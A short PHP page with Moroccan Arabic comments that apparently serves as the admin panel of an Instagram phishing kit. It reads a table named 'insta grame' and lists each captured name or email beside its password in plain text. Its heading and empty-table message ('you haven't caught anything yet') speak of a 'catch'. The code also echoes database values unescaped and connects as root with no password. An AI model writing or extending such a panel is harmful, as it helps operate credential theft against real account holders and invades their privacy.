<?php
// 1. الاتصال بقاعدة البيانات
$conn = mysqli_connect("localhost", "root", "", "gg");

// 2. جلب البيانات من الجدول (استعملنا Backticks حيت كاين فراغ في السمية)
$sql = "SELECT * FROM `insta grame` ORDER BY id DESC";
$result = mysqli_query($conn, $sql);
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - الصيد</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; direction: rtl; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { color: #d63031; text-align: center; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: center; }
        th { background-color: #0984e3; color: white; }
        tr:nth-child(even) { background-color: #f2f2f2; }
        .pass { color: #e17055; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>لوحة تحكم الآدمين - الحسابات المسجلة</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>الإسم / الإيميل</th>
                <th>كلمة السر</th>
            </tr>
        </thead>
        <tbody>
            <?php
            if (mysqli_num_rows($result) > 0) {
                while($row = mysqli_fetch_assoc($result)) {
                    echo "<tr>";
                    echo "<td>" . $row['id'] . "</td>";
                    echo "<td>" . $row['name'] . "</td>";
                    echo "<td class='pass'>" . $row['password'] . "</td>";
                    echo "</tr>";
                }
            } else {
                echo "<tr><td colspan='3'>باقي ما تصيد والو!</td></tr>";
            }
            ?>
        </tbody>
    </table>
</div>

</body>
</html>